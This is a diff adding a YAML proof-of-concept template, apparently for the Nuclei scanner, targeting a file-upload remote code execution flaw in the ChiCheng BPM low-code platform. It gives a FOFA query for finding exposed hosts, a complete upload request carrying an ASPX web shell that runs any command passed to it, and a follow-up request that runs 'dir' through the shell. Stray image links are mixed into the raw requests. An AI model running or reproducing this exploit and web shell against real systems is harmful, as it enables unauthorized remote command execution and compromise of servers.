@@ -1,0 +1,86 @@
+id: poc-mcymfg1dx3akaa5r
+info:
+  name: 驰骋BPM低代码开发平台 RichUploadFile 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mcymfg1dx3akaa5r'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mcymfg1dx3akaa5r
+    fofa: body="/WF/AppClassic/Home.htm" || body="ccbpm" || body="/DataUser/Icon/LogBig.png"
+http:
+- raw:
+  - 'POST /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="edit"; filename="rce.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498952860-2c8b47cc-4562-46db-8b85-148fb1a87bc1.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /DataUser/RichTextFile/Mazi/rce.aspx?cmd=dir HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498953038-30eb7c22-dde8-46ef-b52d-6fa18bb15838.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
